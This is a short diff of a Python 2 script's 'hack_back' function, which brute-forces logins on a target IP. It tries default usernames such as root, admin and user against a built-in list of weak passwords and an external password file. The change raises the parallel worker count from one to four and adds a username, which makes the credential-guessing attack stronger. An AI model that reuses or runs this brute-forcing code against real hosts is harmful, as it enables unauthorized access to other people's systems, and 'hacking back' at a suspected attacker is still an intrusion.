@@ -111,16 +111,16 @@ def attempt(ip,uname,passwd):
 
 
 def hack_back(ip, determined):
-    p = Pool(processes=1)
+    p = Pool(processes=4)
     success = {}
-    names = ['root', 'admin']  #
+    names = ['root', 'admin', 'user']  #
     start = time.time()
     connected = False
     if determined:
         common = ['admin', 'default', 'password', 'password123', 'toor', 'root']
         for entry in swap('common_passwords.txt', False):
             common.append(entry)
-        # random.shuffle(common)
+        # random.shuffle(common
     else:
         common = ['admin', 'default', 'password', 'password123', 'toor', 'root']
     print '... Bruteforcing %s' % ip
